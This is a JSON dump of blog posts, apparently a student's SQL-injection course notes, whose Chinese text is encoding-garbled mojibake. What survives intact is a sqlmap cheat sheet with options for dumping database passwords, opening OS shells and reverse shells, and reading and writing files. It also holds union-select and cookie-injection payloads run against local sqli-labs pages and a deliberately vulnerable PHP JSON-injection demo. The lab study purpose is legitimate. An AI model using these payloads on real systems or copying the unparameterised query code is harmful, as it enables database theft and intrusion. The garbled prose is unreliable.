#æŒ‡å®šå¯æµ‹è¯•çš„å‚æ•°(?page=1&amp;id=2 -p &quot;page,id&quot;) -D &quot;&quot; #æŒ‡å®šæ•°æ®åº“å -T &quot;&quot; #æŒ‡å®šè¡¨å -C &quot;&quot; #æŒ‡å®šå­—æ®µ -s &quot;&quot; #ä¿å­˜æ³¨å…¥è¿‡ç¨‹åˆ°ä¸€ä¸ªæ–‡ä»¶,è¿˜å¯ä¸­æ–­ï¼Œä¸‹æ¬¡æ¢å¤åœ¨æ³¨å…¥(ä¿å­˜ï¼š-s &quot;xx.log&quot; æ¢å¤:-s &quot;xx.log&quot; --resume) --level=(1-5) #è¦æ‰§è¡Œçš„æµ‹è¯•æ°´å¹³ç­‰çº§ï¼Œé»˜è®¤ä¸º1 --risk=(0-3) #æµ‹è¯•æ‰§è¡Œçš„é£é™©ç­‰çº§ï¼Œé»˜è®¤ä¸º1 --time-sec=(2,5) #å»¶è¿Ÿå“åº”ï¼Œé»˜è®¤ä¸º5 --data #é€šè¿‡POSTå‘é€æ•°æ® --columns #åˆ—å‡ºå­—æ®µ --current-user #è·å–å½“å‰ç”¨æˆ·åç§° --current-db #è·å–å½“å‰æ•°æ®åº“åç§° --users #åˆ—æ•°æ®åº“æ‰€æœ‰ç”¨æˆ· --passwords #æ•°æ®åº“ç”¨æˆ·æ‰€æœ‰å¯†ç  --privileges #æŸ¥çœ‹ç”¨æˆ·æƒé™(--privileges -U root) -U #æŒ‡å®šæ•°æ®åº“ç”¨æˆ· --dbs #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ --tables -D &quot;&quot; #åˆ—å‡ºæŒ‡å®šæ•°æ®åº“ä¸­çš„è¡¨ --columns -T &quot;user&quot; -D &quot;mysql&quot; #åˆ—å‡ºmysqlæ•°æ®åº“ä¸­çš„userè¡¨çš„æ‰€æœ‰å­—æ®µ --dump-all #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“æ‰€æœ‰è¡¨ --exclude-sysdbs #åªåˆ—å‡ºç”¨æˆ·è‡ªå·±æ–°å»ºçš„æ•°æ®åº“å’Œè¡¨ --dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot; #åˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„è¡¨çš„å­—æ®µçš„æ•°æ®(--dump -T users -D master -C surname) --dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4 # åˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„è¡¨çš„2-4å­—æ®µçš„æ•°æ® --dbms #æŒ‡å®šæ•°æ®åº“(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) --os #æŒ‡å®šç³»ç»Ÿ(Linux,Windows) -v #è¯¦ç»†çš„ç­‰çº§(0-6) 0ï¼šåªæ˜¾ç¤ºPythonçš„å›æº¯ï¼Œé”™è¯¯å’Œå…³é”®æ¶ˆæ¯ã€‚ 1ï¼šæ˜¾ç¤ºä¿¡æ¯å’Œè­¦å‘Šæ¶ˆæ¯ã€‚ 2ï¼šæ˜¾ç¤ºè°ƒè¯•æ¶ˆæ¯ã€‚ 3ï¼šæœ‰æ•ˆè½½è·æ³¨å…¥ã€‚ 4ï¼šæ˜¾ç¤ºHTTPè¯·æ±‚ã€‚ 5ï¼šæ˜¾ç¤ºHTTPå“åº”å¤´ã€‚ 6ï¼šæ˜¾ç¤ºHTTPå“åº”é¡µé¢çš„å†…å®¹--privileges #æŸ¥çœ‹æƒé™ --is-dba #æ˜¯å¦æ˜¯æ•°æ®åº“ç®¡ç†å‘˜ --roles #æšä¸¾æ•°æ®åº“ç”¨æˆ·è§’è‰² --udf-inject #å¯¼å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼ˆè·å–ç³»ç»Ÿæƒé™ï¼‰ --union-check #æ˜¯å¦æ”¯æŒunion æ³¨å…¥ --union-cols #union æŸ¥è¯¢è¡¨è®°å½• --union-test #union è¯­å¥æµ‹è¯• --union-use #é‡‡ç”¨union æ³¨å…¥ --union-tech orderby #unioné…åˆorder by --data &quot;&quot; #POSTæ–¹å¼æäº¤æ•°æ®(--data &quot;page=1&amp;id=2&quot;) --cookie &quot;ç”¨;å·åˆ†å¼€&quot; #cookieæ³¨å…¥(--cookies=â€PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=lowâ€) --referer &quot;&quot; #ä½¿ç”¨refereræ¬ºéª—(--referer &quot;http://www.baidu.com&quot;) --user-agent &quot;&quot; #è‡ªå®šä¹‰user-agent --proxy &quot;http://127.0.0.1:8118&quot; #ä»£ç†æ³¨å…¥ --string=&quot;&quot; #æŒ‡å®šå…³é”®è¯,å­—ç¬¦ä¸²åŒ¹é…. --threads #é‡‡ç”¨å¤šçº¿ç¨‹(--threads 3) --sql-shell #æ‰§è¡ŒæŒ‡å®šsqlå‘½ä»¤ --sql-query #æ‰§è¡ŒæŒ‡å®šçš„sqlè¯­å¥(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) --file-read #è¯»å–æŒ‡å®šæ–‡ä»¶ --file-write #å†™å…¥æœ¬åœ°æ–‡ä»¶(--file-write /test/test.txt --file-dest /var/www/html/1.txt;å°†æœ¬åœ°çš„test.txtæ–‡ä»¶å†™å…¥åˆ°ç›®æ ‡çš„1.txt) --file-dest #è¦å†™å…¥çš„æ–‡ä»¶ç»å¯¹è·¯å¾„ --os-cmd=id #æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ --os-shell #ç³»ç»Ÿäº¤äº’shell --os-pwn #åå¼¹shell(--os-pwn --msf-path=/opt/framework/msf3/) --msf-path= #matesploitç»å¯¹è·¯å¾„(--msf-path=/opt/framework/msf3/) --os-smbrelay # --os-bof # --reg-read #è¯»å–winç³»ç»Ÿæ³¨å†Œè¡¨ --priv-esc # --time-sec= #å»¶è¿Ÿè®¾ç½® é»˜è®¤--time-sec=5 ä¸º5ç§’ -p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot; #æŒ‡å®šuser-agentæ³¨å…¥ --eta #ç›²æ³¨ /pentest/database/sqlmap/txt/common-columns.txt å­—æ®µå­—å…¸ common-outputs.txtcommon-tables.txt è¡¨å­—å…¸keywords.txtoracle-default-passwords.txtuser-agents.txtwordlist.txt æ¶‰åŠèµ„æº123456789https://www.cnblogs.com/bmjoker/p/9326258.htmlhttps://github.com/youngyangyang04/NoSQLAttackhttps://github.com/sqlmapproject/sqlmap/zipball/masterhttps://blog.csdn.net/qq_39936434/category_9103379.htmlhttps://www.mozhe.cn/bug/WUJ3OGVQSTIyeXdvbHU2ZmV0MjVDUT09bW96aGUmozhe","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"14WEBæ¼æ´--SQLæ³¨å…¥ä¹‹ç±»å‹åŠæäº¤æ³¨å…¥","slug":"14WEBæ¼æ´-SQLæ³¨å…¥ä¹‹ç±»å‹åŠæäº¤æ³¨å…¥","date":"2021-09-21T02:28:58.000Z","updated":"2021-09-21T06:05:28.280Z","comments":true,"path":"2021/09/21/14WEBæ¼æ´-SQLæ³¨å…¥ä¹‹ç±»å‹åŠæäº¤æ³¨å…¥/","link":"","permalink":"https://al0nez.github.io/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† å‰è¨€åœ¨çœŸå® SQL æ³¨å…¥å®‰å…¨æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬ä¸€å®šè¦å…ˆæ˜ç¡®æäº¤æ•°æ®åŠæäº¤æ–¹æ³•åå†è¿›è¡Œæ³¨å…¥ï¼Œå…¶ä¸­æäº¤æ•°æ®ç±»å‹å’Œæäº¤æ–¹æ³•å¯ä»¥é€šè¿‡æŠ“åŒ…åˆ†æè·å–ï¼Œåç»­å®‰å…¨æµ‹è¯•ä¸­æˆ‘ä»¬ä¹Ÿå¿…é¡»æ»¡è¶³åŒç­‰çš„æ“ä½œæ‰èƒ½è¿›è¡Œæ³¨å…¥ã€‚ ç®€è¦æ˜ç¡®å‚æ•°ç±»å‹æ•°å­—ï¼Œå­—ç¬¦ï¼Œæœç´¢ï¼ŒJSON ç­‰ æ•°å­—å‹ å¯ä»¥çœ‹åˆ°id=1ï¼Œæ˜¯æ•°å­—å‹ å­—ç¬¦å‹ email_id =&#39;Dumb@dhakkan.com&#39;æˆ‘ä»¬å¿…é¡»ç”¨â€™æˆ–è€…â€™â€™åŒ…è£¹ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼Œå› ä¸ºä»–æ˜¯å­—ç¬¦å‹ã€‚ ä¾‹å¦‚12345678$name = $_GET[&#x27;x&#x27;]$sql = &quot;select * from user where name = &#x27;$name&#x27;&quot;æˆ‘ä»¬å¦‚æœè¦æ³¨å…¥å°±å¿…é¡»è¿™æ ·å†™?x=xiaodi&#x27; and 1=1 --+æ­£ç¡®?x=xiaodi&#x27; and 1=1 --+é”™è¯¯å¸¦åˆ°æ•°æ®åº“ä¸­$sql =&quot; select * from user where name = &#x27;xiaodi&#x27; and 1=1 --+&#x27;&quot; æ­£ç¡®$sql =&quot; select * from user where name = &#x27;xiaodi and 1=1 --+&#x27;&quot; é”™è¯¯ å¹²æ‰°ç¬¦å·1ä¸€èˆ¬æ˜¯&#x27;,&quot;,%,),&#125; 12345678910id&#x27;id&#x27;&quot;id&quot;(&#x27;id&#x27;)(&quot;id&quot;)&quot;&#x27;id&#x27;&quot;(&quot;&#x27;id&#x27;&quot;)(&#x27;&quot;id&quot;&#x27;)&#x27;%id%&#x27;...... ç®€è¦æ˜ç¡®è¯·æ±‚æ–¹æ³•1GET,POST,COOKIE,REQUEST,HTTP å¤´ç­‰ å¯ä»¥åœ¨networkä¸­æŸ¥çœ‹ GETè¯·æ±‚ç›´æ¥åœ¨æµè§ˆå™¨åé¢æ·»åŠ å‚æ•°å°±å¯ä»¥ 1http://127.0.0.1/?id=1 POSTè¯·æ±‚1éœ€è¦é€šè¿‡POSTè¯·æ±‚æ¥å†™å…¥å‚æ•° cookie12éœ€è¦å°†cookieå†™å…¥è¯·æ±‚å¤´ä¸­æ‰å¯ä»¥ä¼ é€’cookie:c=xxxxx REQUESTè¯·æ±‚ REQUEST å…¨éƒ¨æ¥æ”¶ï¼Œç½‘ç«™åœ¨è®¿é—®çš„æ—¶å€™ç”±äºæˆ‘ä»¬å¤§å¤šæ•°æ˜¯é»‘ç›’æµ‹è¯•ï¼Œä¸çŸ¥é“å¯¹æ–¹ä»£ç å†™æ³•ï¼Œå¦‚æœå¯¹æ–¹é‡‡ç”¨REQUESTæ¥æ”¶æ–¹å¼ï¼Œå°±ä¸éœ€è¦è€ƒè™‘ç”¨ä½•ç§æ–¹æ³•å»æäº¤ï¼Œå› ä¸ºç”¨GETã€POSTéƒ½å¯ä»¥ã€‚å¦‚æœå¯¹æ–¹æ˜¯å•ä¸€æ¥æ”¶æ–¹å¼ï¼Œé‚£ä¹ˆåœ¨æ³¨å…¥çš„æ—¶å€™éœ€è¦ç”¨å®ƒçš„æ–¹æ³•å»æ³¨å…¥ã€‚ $_SERVER$_SERVERæ˜¯PHPé‡Œå†…ç½®å˜é‡ï¼Œå…¨å±€å˜é‡ï¼ŒPHPå†™è„šæœ¬æ—¶ç”¨å®ƒæ¥è·å–ç³»ç»Ÿçš„å€¼ï¼Œåœ¨æ•°æ®åŒ…çš„æŸä¸€ä¸ªåœ°æ–¹å¯ä»¥è¿›è¡Œæ³¨å…¥ JSONæ³¨å…¥ç›¸å…³çŸ¥è¯†JSONåŸºç¡€ç®€ä»‹ JSON æ˜¯å­˜å‚¨å’Œäº¤æ¢æ–‡æœ¬ä¿¡æ¯çš„è¯­æ³•ï¼Œæ˜¯è½»é‡çº§çš„æ–‡æœ¬æ•°æ®äº¤æ¢æ ¼å¼ã€‚ç±»ä¼¼xmlï¼Œä½†JSON æ¯” XML æ›´å°ã€æ›´å¿«ï¼Œæ›´æ˜“è§£æã€‚æ‰€ä»¥ç°åœ¨æ¥å£æ•°æ®ä¼ è¾“éƒ½é‡‡ç”¨jsonæ–¹å¼è¿›è¡Œã€‚JSON æ–‡æœ¬çš„ MIME ç±»å‹æ˜¯ â€œapplication/jsonâ€ JSONè¯­æ³• æ•°æ®åœ¨åç§°/å€¼å¯¹ä¸­ æ•°æ®ç”±é€—å·åˆ†éš” å¤§æ‹¬å·ä¿å­˜å¯¹è±¡ ä¸­æ‹¬å·ä¿å­˜æ•°ç»„ JSONå€¼ æ•°å­—ï¼ˆæ•´æ•°æˆ–æµ®ç‚¹æ•°ï¼‰ {â€œageâ€:30 } å­—ç¬¦ä¸²ï¼ˆåœ¨åŒå¼•å·ä¸­ï¼‰ {â€œunameâ€:â€yangâ€} é€»è¾‘å€¼ï¼ˆtrue æˆ– falseï¼‰ {â€œflagâ€:true } æ•°ç»„ï¼ˆåœ¨ä¸­æ‹¬å·ä¸­ï¼‰{â€œsitesâ€:[{â€œnameâ€:â€yangâ€},{â€œnameâ€:â€mingâ€}]} å¯¹è±¡ï¼ˆåœ¨å¤§æ‹¬å·ä¸­ï¼‰JSON å¯¹è±¡åœ¨å¤§æ‹¬å·ï¼ˆ{}ï¼‰ä¸­ä¹¦å†™ï¼š null { â€œrunoobâ€:null } JSONä»£ç æ ¼å¼ 123456789101112131415161718192021&#123; &quot;users&quot;: &#123; &quot;user&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;username&quot;: &quot;admin&quot;, &quot;passwd&quot;: &quot;admin888&quot; &#125;, &#123; &quot;id&quot;: &quot;2&quot;, &quot;username&quot;: &quot;root&quot;, &quot;passwd&quot;: &quot;root123&quot; &#125;, &#123; &quot;id&quot;: &quot;3&quot;, &quot;username&quot;: &quot;system&quot;, &quot;passwd&quot;: &quot;system456&quot; &#125; ] &#125;&#125; JSONæ³¨å…¥JSONæ³¨å…¥æ˜¯æŒ‡åº”ç”¨ç¨‹åºæ‰€è§£æçš„JSONæ•°æ®æ¥æºäºä¸å¯ä¿¡èµ–çš„æ•°æ®æºï¼Œç¨‹åºæ²¡æœ‰å¯¹è¿™äº›ä¸å¯ä¿¡èµ–çš„æ•°æ®è¿›è¡ŒéªŒè¯ã€è¿‡æ»¤ï¼Œå¦‚æœåº”ç”¨ç¨‹åºä½¿ç”¨æœªç»éªŒè¯çš„è¾“å…¥æ„é€  JSONï¼Œåˆ™å¯ä»¥æ›´æ”¹ JSON æ•°æ®çš„è¯­ä¹‰ã€‚åœ¨ç›¸å¯¹ç†æƒ³çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ’å…¥æ— å…³çš„å…ƒç´ ï¼Œå¯¼è‡´åº”ç”¨ç¨‹åºåœ¨è§£æ JSONæ•°æ®æ—¶æŠ›å‡ºå¼‚å¸¸ã€‚ æ¼”ç¤ºæ¡ˆä¾‹ï¼šå‚æ•°å­—ç¬¦å‹æ³¨å…¥æµ‹è¯•less5å•å¼•å·é—­åˆ 1http://127.0.0.1/sqli/Less-5/?id=3&#x27; order by 3 --+ less6åŒå¼•å·é—­åˆ 1http://127.0.0.1/sqli/Less-6/?id=3&quot; and 1=1--+ POST æ•°æ®æäº¤æ³¨å…¥æµ‹è¯•less111uname=admin&#x27; and 1=2 #&amp;passwd=admin&amp;submit=Submit 1uname=admin&#x27; and 1=1 #&amp;passwd=admin&amp;submit=Submit ï‚² å‚æ•° JSON æ•°æ®æ³¨å…¥æµ‹è¯•=&gt;æœ¬åœ°ç¯å¢ƒä»£ç æ¼”ç¤º COOKIE æ•°æ®æäº¤æ³¨å…¥æµ‹è¯•éœ€è¦å…ˆç™»å½•ï¼Œç„¶åè¿›è¡Œcookieæ³¨å…¥ 123456789101112131415GET /sqli/Less-20/index.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/sqli/Less-20/Connection: closeCookie: uname=admi&#x27; union select 1,database(),3#; csrftoken=vKkecYAHNQy0hBzIqkW7oaJw91c8w1DPtQhCAWIXKPPgjuxTF3uii1r7lXPlDHeLUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1Cache-Control: max-age=0 HTTP å¤´éƒ¨å‚æ•°æ•°æ®æ³¨å…¥æµ‹è¯•UAå¤´æ³¨å…¥ é—­åˆæ‰å‰é¢çš„ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥ é…åˆ sqlilabs æœ¬åœ°æ•°æ®åº“æ¼”ç¤º1234567891011121314151617181920212223242526272829303132333435&lt;?phpheader(&#x27;content-type:text/html;charset=utf-8&#x27;);if(isset($_POST[&#x27;json&#x27;]))&#123;$json_str=$_POST[&#x27;json&#x27;];$json=json_decode($json_str);if(!$json)&#123;die(&#x27;JSON æ–‡æ¡£æ ¼å¼æœ‰è¯¯ï¼Œè¯·æ£€æŸ¥&#x27;);&#125;$username=$json-&gt;username;//$passwd=$json-&gt;passwd;$mysqli=new mysqli();$mysqli-&gt;connect(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;);if($mysqli-&gt;connect_errno)&#123;die(&#x27;æ•°æ®åº“è¿æ¥å¤±è´¥ï¼š&#x27;.$mysqli-&gt;connect_error);&#125;$mysqli-&gt;select_db(&#x27;security&#x27;);if($mysqli-&gt;errno)&#123;dir(&#x27;æ‰“å¼€æ•°æ®åº“å¤±è´¥ï¼š&#x27;.$mysqli-&gt;error);&#125;$mysqli-&gt;set_charset(&#x27;utf-8&#x27;);$sql=&quot;SELECT * FROM users WHERE username=&#x27;&#123;$username&#125;&#x27;&quot;;echo $sql;$result=$mysqli-&gt;query($sql);if(!$result)&#123;die(&#x27;æ‰§è¡Œ SQL è¯­å¥å¤±è´¥ï¼š&#x27;.$mysqli-&gt;error);&#125;else if($result-&gt;num_rows==0)&#123;die(&#x27;æŸ¥è¯¢ç»“æœä¸ºç©º&#x27;);&#125;else &#123;$array1=$result-&gt;fetch_all(MYSQLI_ASSOC);echo &quot;ç”¨æˆ·åï¼š&#123;$array1[0][&#x27;username&#x27;]&#125;,å¯†ç ï¼š&#123;$array1[0][&#x27;password&#x27;]&#125;&quot;;&#125;$result-&gt;free();$mysqli-&gt;close();&#125;?&gt;","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"13WEBæ¼æ´--SQLæ³¨å…¥ä¹‹MYSQLæ³¨å…¥","slug":"13WEBæ¼æ´-SQLæ³¨å…¥ä¹‹MYSQLæ³¨å…¥","date":"2021-09-21T02:28:40.000Z","updated":"2021-09-21T06:05:32.290Z","comments":true,"path":"2021/09/21/13WEBæ¼æ´-SQLæ³¨å…¥ä¹‹MYSQLæ³¨å…¥/","link":"","permalink":"https://al0nez.github.io/2021/09/21/13WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† å‰è¨€MYSQL æ³¨å…¥ä¸­é¦–å…ˆè¦æ˜ç¡®å½“å‰æ³¨å…¥ç‚¹æƒé™ï¼Œé«˜æƒé™æ³¨å…¥æ—¶æœ‰æ›´å¤šçš„æ”»å‡»æ‰‹æ³•ï¼Œæœ‰çš„èƒ½ç›´æ¥è¿›è¡Œ getshell æ“ä½œã€‚å…¶ä¸­ä¹Ÿä¼šé‡åˆ°å¾ˆå¤šé˜»ç¢ï¼Œç›¸å…³é˜²å¾¡æ–¹æ¡ˆä¹Ÿè¦æ˜ç¡®ï¼Œæ‰€è°“çŸ¥å·±çŸ¥å½¼,ç™¾æˆ˜ä¸æ®†ã€‚ä¸è®ºä½œä¸ºæ”»å‡»è¿˜æ˜¯é˜²å¾¡éƒ½éœ€è¦äº†è§£å…¶ä¸­çš„æ‰‹æ³•å’ŒåŸç†ï¼Œè¿™æ ·æ‰æ˜¯ä¸€ä¸ªåˆæ ¼çš„å®‰å…¨å·¥ä½œè€…ã€‚ é«˜æƒé™æ³¨å…¥æ£€æŸ¥æƒé™1?id=-1 union select 1,user(),3 å¦‚æœæ˜¯rootåˆ™ä¸ºé«˜æƒé™ï¼Œé«˜æƒé™ç”¨æˆ·å¯ä»¥è·¨åº“æ³¨å…¥ï¼Œæ™®é€šç”¨æˆ·åªèƒ½æ³¨å…¥è‡ªå·±çš„æ•°æ®åº“ã€‚ æƒé™åœ¨è¿™é‡Œè®¾ç½® è·¨åº“æŸ¥è¯¢åŠåº”ç”¨æ€è·¯information_schema è¡¨ç‰¹æ€§ï¼Œè®°å½•åº“åï¼Œè¡¨åï¼Œåˆ—åå¯¹åº”è¡¨ è·å–æ‰€æœ‰æ•°æ®åº“åï¼š1http://127.0.0.1/sqli/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata --+ è·å–æŒ‡å®š pikachuæ•°æ®åº“åä¸‹çš„è¡¨åä¿¡æ¯ï¼š1http://127.0.0.1/sqli/Less-2/?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;pikachu&#x27; --+ è·å–æŒ‡å®špikachuä¸‹çš„è¡¨å users ä¸‹çš„åˆ—åä¿¡æ¯ï¼š1http://127.0.0.1/sqli/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;pikachu&#x27; --+ è·å–æŒ‡å®š pikachuä¸‹çš„ users æ•°æ®1http://127.0.0.1/sqli/Less-2/?id=-1 union select 1,group_concat(concat_ws(0x7e,username,password)),3 from pikachu.users--+ æ–‡ä»¶è¯»å†™æ“ä½œ12345load_file()ï¼šè¯»å–å‡½æ•°into outfile æˆ– into dumpfile ï¼šå¯¼å‡ºå‡½æ•°select load_file(&#x27;D:\\\\phpStudy\\\\WWW\\\\sqli\\\\Less-7\\\\test.txt&#x27;);select &#x27;crow&#x27; into outfile &#x27;D:\\\\phpStudy\\\\WWW\\\\sqli\\\\Less-7\\\\test.txt&#x27;; å†™å…¥å†…å®¹ä¸ºcrow è·¯å¾„è·å–å¸¸è§æ–¹æ³•ï¼šæŠ¥é”™æ˜¾ç¤ºï¼Œé—ç•™æ–‡ä»¶ï¼Œæ¼æ´æŠ¥é”™ï¼Œå¹³å°é…ç½®æ–‡ä»¶ï¼Œçˆ†ç ´ç­‰ windowsä¸€èˆ¬è·¯å¾„:1d:/wwwroot/xiaodi8/ linuxä¸€èˆ¬è·¯å¾„:1/var/www/xiaodi8 å¸¸è§è¯»å–æ–‡ä»¶åˆ—è¡¨ï¼šå¸¸è§å†™å…¥æ–‡ä»¶é—®é¢˜ï¼šé­”æœ¯å¼•å·å¼€å…³ magic_quotes_gpcå‡½æ•°åœ¨phpä¸­çš„ä½œç”¨æ˜¯åˆ¤æ–­è§£æç”¨æˆ·æç¤ºçš„æ•°æ®ï¼Œå¦‚åŒ…æ‹¬æœ‰:postã€getã€cookieè¿‡æ¥çš„æ•°æ®å¢åŠ è½¬ä¹‰å­—ç¬¦â€œ\\â€ï¼Œä»¥ç¡®ä¿è¿™äº›æ•°æ®ä¸ä¼šå¼•èµ·ç¨‹åºï¼Œç‰¹åˆ«æ˜¯æ•°æ®åº“è¯­å¥å› ä¸ºç‰¹æ®Šå­—ç¬¦å¼•èµ·çš„æ±¡æŸ“è€Œå‡ºç°è‡´å‘½çš„é”™è¯¯ã€‚ åœ¨magic_quotes_gpc=Onçš„æƒ…å†µä¸‹ï¼Œå¦‚æœè¾“å…¥çš„æ•°æ®æœ‰å•å¼•å·ï¼ˆâ€™ï¼‰ã€åŒå¼•å·ï¼ˆâ€ï¼‰ã€åæ–œçº¿ï¼ˆï¼‰ä¸ NULï¼ˆNULL å­—ç¬¦ï¼‰ç­‰å­—ç¬¦éƒ½ä¼šè¢«åŠ ä¸Šåæ–œçº¿ã€‚è¿™äº›è½¬ä¹‰æ˜¯å¿…é¡»çš„ï¼Œå¦‚æœè¿™ä¸ªé€‰é¡¹ä¸ºoffï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¿…é¡»è°ƒç”¨addslashesè¿™ä¸ªå‡½æ•°æ¥ä¸ºå­—ç¬¦ä¸²å¢åŠ è½¬ä¹‰ã€‚ 1magic_quotes_gpc é­”æœ¯å¼•å·åŠå¸¸è§é˜²æŠ¤ç¼–ç æˆ–å®½å­—èŠ‚ç»•è¿‡ï¼šæ¯”å¦‚åœ¨sqlmapä¸­æ·»åŠ â€“temperè„šæœ¬å‚æ•°è½¬ç æˆ–è€…ä½¿ç”¨è½¬æ¢å·¥å…· addslashes() å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚ é¢„å®šä¹‰å­—ç¬¦æ˜¯ï¼š å•å¼•å·ï¼ˆâ€™ï¼‰ åŒå¼•å·ï¼ˆâ€ï¼‰ åæ–œæ ï¼ˆ\\ï¼‰ NULL é˜²æŠ¤è‡ªå¸¦é˜²å¾¡ï¼šé­”æœ¯å¼•å· å†…ç½®å‡½æ•°ï¼šintã€addslashes() å‡½æ•°ç­‰ çº¯æ•°å­—è¿‡æ»¤é¥¶è¿‡ä¸äº† å…³é”®å­—è¿‡æ»¤ å°†selectæ›¿æ¢ä¸ºfuck,è¿™ç§å¯ä»¥é€šè¿‡å¤§å°å†™ç»•è¿‡ã€‚ WAFé˜²æŠ¤è½¯ä»¶ å®‰å…¨ç‹—ã€å®å¡”ç­‰ ä½ç‰ˆæœ¬æ³¨å…¥é…åˆè¯»å–æˆ–æš´åŠ›å­—å…¸æˆ–è¯»å– æ¶‰åŠèµ„æºï¼š1https://blog.csdn.net/weixin_30292843/article/details/99381669","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"12WEBæ¼æ´--SQLæ³¨å…¥ä¹‹ç®€è¦SQLæ³¨å…¥","slug":"12WEBæ¼æ´-SQLæ³¨å…¥ä¹‹ç®€è¦SQLæ³¨å…¥","date":"2021-09-21T02:28:19.000Z","updated":"2021-09-21T06:05:36.536Z","comments":true,"path":"2021/09/21/12WEBæ¼æ´-SQLæ³¨å…¥ä¹‹ç®€è¦SQLæ³¨å…¥/","link":"","permalink":"https://al0nez.github.io/2021/09/21/12WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† å‰è¨€åœ¨æœ¬ç³»åˆ—è¯¾ç¨‹å­¦ä¹ ä¸­ï¼ŒSQL æ³¨å…¥æ¼æ´å°†æ˜¯é‡ç‚¹éƒ¨åˆ†ï¼Œå…¶ä¸­ SQL æ³¨å…¥åˆéå¸¸å¤æ‚ï¼ŒåŒºåˆ†å„ç§æ•°æ®åº“ç±»å‹ï¼Œæäº¤æ–¹æ³•ï¼Œæ•°æ®ç±»å‹ç­‰æ³¨å…¥ï¼Œæˆ‘ä»¬éœ€è¦æŒ‰éƒ¨å°±ç­çš„å­¦ä¹ ï¼Œæ‰èƒ½å­¦ä¼šç›¸å…³ SQL æ³¨å…¥çš„æ ¸å¿ƒã€‚åŒæ ·æ­¤ç±»æ¼æ´æ˜¯WEB 